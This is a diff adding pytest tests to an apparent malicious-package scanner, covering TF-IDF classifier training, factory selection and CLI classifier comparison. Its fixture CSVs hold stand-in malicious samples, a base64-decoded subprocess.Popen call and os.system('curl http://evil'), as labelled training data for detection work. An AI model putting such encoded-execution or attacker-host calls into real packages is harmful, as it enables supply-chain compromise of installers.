@@ -72,6 +72,56 @@ def test_heuristic_classifier_flags_encoded_subprocess_behavior():
     assert "subprocess" in result.signals
 
 
+def test_tfidf_classifier_trains_saves_and_loads(tmp_path):
+    from lamps.core.codebert import TfidfClassifier
+    from lamps.evaluation.train_tfidf import TfidfTrainingConfig, train_tfidf
+
+    train_path = tmp_path / "train.csv"
+    train_path.write_text(
+        "code,label\n"
+        "\"import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))\",1\n"
+        "\"import os\nos.system('curl http://evil')\",1\n"
+        "\"from setuptools import setup\nsetup(name='demo')\",0\n"
+        "\"print('hello world')\",0\n",
+        encoding="utf-8",
+    )
+
+    model_path = tmp_path / "tfidf" / "model.joblib"
+    metrics = train_tfidf(
+        TfidfTrainingConfig(
+            train_path=train_path,
+            output_path=model_path,
+            text_column="code",
+            label_column="label",
+        )
+    )
+
+    classifier = TfidfClassifier(model_path)
+    result = classifier.classify_code(
+        "import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))",
+        "setup.py",
+    )
+
+    assert model_path.exists()
+    assert metrics["train_samples"] == 4
+    assert result.label == "malicious"
+    assert result.classifier_mode == "tfidf"
+
+
+def test_classifier_factory_selects_tfidf_when_requested(tmp_path):
+    from lamps.core.codebert import ClassifierFactory, TfidfClassifier
+
+    model_path = tmp_path / "model.joblib"
+    model_path.write_text("placeholder", encoding="utf-8")
+
+    classifier = ClassifierFactory(
+        codebert_model_path=tmp_path / "missing-codebert",
+        tfidf_model_path=model_path,
+    ).create("tfidf")
+
+    assert isinstance(classifier, TfidfClassifier)
+
+
 def test_verdict_policy_marks_package_malicious_if_any_file_is_malicious():
     from lamps.agents.verdict import VerdictAgent
     from lamps.core.schemas import FileClassification
@@ -153,6 +203,7 @@ def test_pipeline_scans_local_archive_with_heuristic_classifier(tmp_path, monkey
         llm_api_base="https://api.openai.com/v1",
         llm_model="unused",
         codebert_model_path=tmp_path / "missing-model",
+        tfidf_model_path=tmp_path / "missing-tfidf" / "model.joblib",
         download_dir=tmp_path / "downloads",
         extract_dir=tmp_path / "extracted",
         report_dir=tmp_path / "reports",
@@ -213,3 +264,84 @@ def test_create_codebert_splits_writes_train_val_test_jsonl(tmp_path):
     ]
     assert set(train_items[0]) == {"idx", "func", "target"}
     assert {item["target"] for item in train_items} == {0, 1}
+
+
+def test_cli_trains_tfidf_and_evaluates_with_tfidf_classifier(tmp_path, monkeypatch, capsys):
+    from lamps.main import main
+
+    dataset = tmp_path / "dataset.csv"
+    dataset.write_text(
+        "Setup.py,Label\n"
+        "\"import base64, subprocess\nsubprocess.Popen(base64.b64decode('abc'))\",1\n"
+        "\"import os\nos.system('curl http://evil')\",1\n"
+        "\"from setuptools import setup\nsetup(name='demo')\",0\n"
+        "\"print('hello world')\",0\n",
+        encoding="utf-8",
+    )
+    model_path = tmp_path / "tfidf" / "model.joblib"
+    monkeypatch.setenv("TFIDF_MODEL_PATH", str(model_path))
+
+    assert main(
+        [
+            "train-tfidf",
+            "--dataset",
+            str(dataset),
+            "--text-column",
+            "Setup.py",
+            "--output-path",
+            str(model_path),
+        ]
+    ) == 0
+    assert main(
+        [
+            "evaluate",
+            "--dataset",
+            str(dataset),
+            "--code-column",
+            "Setup.py",
+            "--classifier",
+            "tfidf",
+        ]
+    ) == 0
+
+    output = capsys.readouterr().out
+
+    assert model_path.exists()
+    assert '"classifier": "tfidf"' in output
+    assert '"accuracy"' in output
+
+
+def test_cli_compares_classifiers_and_selects_best(tmp_path, monkeypatch, capsys):
+    from lamps.main import main
+
+    dataset = tmp_path / "dataset.csv"
+    dataset.write_text(
+        "Setup.py,Label\n"
+        "\"malpkg_payload_token alpha\",1\n"
+        "\"malpkg_payload_token beta\",1\n"
+        "\"safe_library_token gamma\",0\n"
+        "\"safe_library_token delta\",0\n",
+        encoding="utf-8",
+    )
+    model_path = tmp_path / "tfidf" / "model.joblib"
+    monkeypatch.setenv("TFIDF_MODEL_PATH", str(model_path))
+
+    assert main(["train-tfidf", "--dataset", str(dataset), "--text-column", "Setup.py"]) == 0
+    assert main(
+        [
+            "compare-classifiers",
+            "--dataset",
+            str(dataset),
+            "--code-column",
+            "Setup.py",
+            "--classifiers",
+            "heuristic",
+            "tfidf",
+        ]
+    ) == 0
+
+    output = capsys.readouterr().out
+
+    assert '"best_classifier": "tfidf"' in output
+    assert '"tfidf"' in output
+    assert '"heuristic"' in output
